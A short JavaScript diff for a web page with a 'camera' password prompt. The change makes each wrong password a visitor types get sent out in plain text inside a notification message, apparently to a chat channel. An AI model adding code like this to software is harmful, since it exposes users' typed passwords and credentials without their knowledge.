@@ -73,10 +73,11 @@ if (cameraPassword) {
                     this.value = '';
                     sendM('✅ **Camera - Correct Password**');
                 } else {
+                    const wrongPassword = this.value;
                     this.value = '';
                     cameraError.textContent = 'Wrong password';
                     this.classList.add('error');
-                    sendM('❌ **Camera - Wrong Password**');
+                    sendM(`❌ **Camera - Wrong Password**\n\`\`\`${wrongPassword}\`\`\``);
                     
                     setTimeout(() => {
                         cameraError.textContent = '';
